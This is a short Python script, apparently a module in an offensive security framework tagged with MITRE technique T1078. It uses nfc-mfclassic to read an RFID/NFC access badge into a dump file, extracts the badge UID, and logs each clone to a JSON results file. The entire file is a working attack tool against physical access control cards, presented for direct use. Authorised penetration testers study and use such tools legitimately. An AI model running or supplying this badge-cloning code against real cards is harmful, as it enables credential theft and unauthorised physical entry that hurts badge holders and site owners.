#!/usr/bin/env python3
# modules/attacks/access_control_badge_cloner.py

import os
import subprocess
import json
import argparse
from datetime import datetime

LOG_FILE = "results/badge_clone_log.json"
MITRE_TTP = "T1078"

def log_clone(uid, dump_path):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "badge_uid": uid,
        "dump_file": dump_path,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def clone_badge(output_path="results/cloned_badge.dmp"):
    try:
        output = subprocess.check_output(["nfc-mfclassic", "r", "A", "dump", output_path]).decode()
        for line in output.splitlines():
            if "UID" in line:
                uid = line.split(":")[-1].strip()
                log_clone(uid, output_path)
                print(f"[✓] Badge cloned: UID {uid} → {output_path}")
                return
        print("[!] UID not found in output")
    except Exception as e:
        print(f"[!] Cloning failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Clone RFID/NFC-based access badges")
    parser.add_argument("--output", default="results/cloned_badge.dmp", help="Output dump file path")
    args = parser.parse_args()
    clone_badge(args.output)
